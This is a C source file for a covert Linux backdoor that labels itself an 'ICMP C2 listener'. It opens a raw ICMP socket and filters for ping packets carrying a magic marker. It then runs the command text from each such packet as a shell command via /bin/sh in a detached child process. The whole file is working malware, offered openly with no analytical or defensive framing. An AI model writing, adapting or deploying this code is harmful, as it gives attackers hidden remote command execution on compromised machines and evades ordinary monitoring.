#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <linux/filter.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>

#define MAGIC      0x4d414749U
#define CMD_MAXLEN 60
#define ICMP_HDR   8
#define IP_HDR_MIN 20

static struct sock_filter icmp_magic_filter[] = {

    { 0x30, 0, 0, 0x00000009 },
    { 0x15, 0, 3, 0x00000001 },

    { 0x30, 0, 0, 0x00000014 },
    { 0x15, 0, 1, 0x00000008 },

    { 0x20, 0, 0, 0x0000001c },
    { 0x15, 0, 1, MAGIC      },

    { 0x06, 0, 0, 0x0000ffff },

    { 0x06, 0, 0, 0x00000000 },
};

int main(void)
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) { perror("socket"); return 1; }

    struct sock_fprog prog = {
        .len    = sizeof(icmp_magic_filter) / sizeof(icmp_magic_filter[0]),
        .filter = icmp_magic_filter,
    };
    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0) {
        perror("SO_ATTACH_FILTER"); return 1;
    }

    signal(SIGCHLD, SIG_IGN);

    printf("[*] ICMP C2 listener active (magic=0x%08x)\n", MAGIC);
    printf("[*] send ICMP echo-request with 'MAGI' + command at payload offset 28\n");

    uint8_t buf[1500];
    for (;;) {
        ssize_t n = recv(sock, buf, sizeof(buf), 0);
        if (n < 0) { if (errno == EINTR) continue; perror("recv"); break; }

        int ihl = (buf[0] & 0x0f) * 4;
        if ((int)n < ihl + ICMP_HDR + 4) continue;

        uint8_t icmp_type = buf[ihl];
        if (icmp_type != 8) continue;

        uint32_t marker;
        memcpy(&marker, buf + ihl + ICMP_HDR, 4);
        if (marker != htonl(MAGIC)) continue;

        char cmd[CMD_MAXLEN + 1] = {};
        int data_off = ihl + ICMP_HDR + 4;
        int avail = (int)n - data_off;
        if (avail <= 0) continue;
        int cmdlen = avail < CMD_MAXLEN ? avail : CMD_MAXLEN;
        memcpy(cmd, buf + data_off, (size_t)cmdlen);
        cmd[CMD_MAXLEN] = '\0';

        uint8_t *src = buf + 12;
        printf("[+] cmd from %u.%u.%u.%u: %s\n", src[0], src[1], src[2], src[3], cmd);
        fflush(stdout);

        if (cmd[0] != '\0') {
            pid_t p = fork();
            if (p == 0) {
                setsid();
                char *sh[] = { "/bin/sh", "-c", cmd, NULL };
                char *env[] = { "PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL };
                execve("/bin/sh", sh, env);
                _exit(1);
            }
            (void)p;
        }
    }

    close(sock);
    return 0;
}
